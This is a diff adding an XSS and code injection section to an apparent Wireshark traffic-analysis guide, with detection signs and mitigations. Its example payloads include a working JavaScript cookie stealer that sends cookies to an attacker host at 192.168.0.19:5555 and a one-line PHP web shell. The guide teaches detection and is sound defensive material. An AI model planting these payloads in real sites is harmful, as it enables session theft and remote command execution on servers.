@@ -1316,7 +1316,113 @@ Host: 192.168.10.5
 
 ### XSS & Code Injection
 
-*Coming soon...*
+> 📌 **XSS (Cross-Site Scripting)** - Attack where malicious JavaScript is injected into web pages, executing in victims' browsers to steal session data, cookies, and tokens.
+
+> 📌 **Code Injection** - Attack that injects malicious code (PHP, JavaScript, etc.) into server-side scripts through user input.
+
+#### What is XSS & Code Injection?
+
+**Cross-Site Scripting (XSS):**
+- Attackers inject malicious JavaScript into web pages
+- Executes in victims' browsers when they visit the compromised page
+- Used to steal:
+  - Session cookies
+  - Authentication tokens
+  - Sensitive browser data
+
+**Code Injection:**
+- Attacker injects server-side code through user input
+- Can execute commands on the server
+- Common targets: comment fields, search boxes, forms
+
+#### Related PCAP
+
+- `XSS_Simple.pcapng`
+
+#### Detecting XSS in Network Traffic
+
+**Wireshark Filter:** Look for HTTP requests with cookies being sent to unexpected destinations
+```
+http
+```
+
+![HTTP with Cookies](https://github.com/user-attachments/assets/6b59a9ce-9efa-404a-af15-d7130a7c645c)
+
+*Wireshark capture showing HTTP requests with cookies between 192.168.10.3 and 192.168.10.5.*
+
+**Follow HTTP Stream:** Right-click → Follow → HTTP Stream
+
+![HTTP Stream Cookie](https://github.com/user-attachments/assets/f884a7f3-9416-4a85-9215-d97f6a5945a0)
+
+*HTTP GET request with cookie parameter, resulting in 404 error response.*
+
+##### Signs of XSS Attack
+
+- HTTP requests containing cookies/tokens sent to unrecognized external IPs
+- Unusual data exfiltration patterns
+- Scripts being sent in HTTP requests
+- Unexpected user input appearing in server responses
+
+#### Example Attack Payloads
+
+##### JavaScript Cookie Stealer (Injected in Comment Field)
+
+```javascript
+<script>
+  window.addEventListener("load", function() {
+    const url = "http://192.168.0.19:5555";
+    const params = "cookie=" + encodeURIComponent(document.cookie);
+    const request = new XMLHttpRequest();
+    request.open("GET", url + "?" + params);
+    request.send();
+  });
+</script>
+```
+
+This payload:
+1. Waits for page to load
+2. Collects victim's cookies
+3. Sends cookies to attacker-controlled server (192.168.0.19:5555)
+
+##### PHP Command Injection
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+Allows remote command execution via URL parameter `?cmd=<command>`
+
+##### PHP Single Command Execution
+
+```php
+<?php echo `whoami` ?>
+```
+
+Executes `whoami` command on the server
+
+#### Detection Signs
+
+| Sign | Description |
+|------|-------------|
+| Unexpected cookie destinations | Cookies sent to unrecognized IPs |
+| Script tags in requests | `<script>` tags in HTTP body |
+| PHP code in inputs | `<?php` tags appearing in traffic |
+| External data transfers | Large data going to unexpected destinations |
+| Base64 encoded data | Obfuscated payloads |
+
+#### Prevention & Mitigation
+
+| Method | Description |
+|--------|-------------|
+| **Input Sanitization** | Validate and sanitize all user inputs |
+| **Output Encoding** | Encode output to prevent execution |
+| **Content Security Policy** | Set CSP headers to block inline scripts |
+| **HTTPOnly Cookies** | Set HttpOnly flag on cookies |
+| **Input Validation** | Use allowlists for acceptable input |
+| **Regular Patching** | Keep web application updated |
+| **Web Application Firewall** | Deploy WAF to filter malicious inputs |
+
+> 💡 **Key Indicator:** Cookies/tokens sent to unknown external IPs → possible XSS data exfiltration!
 
 ### SSL Renegotiation
 
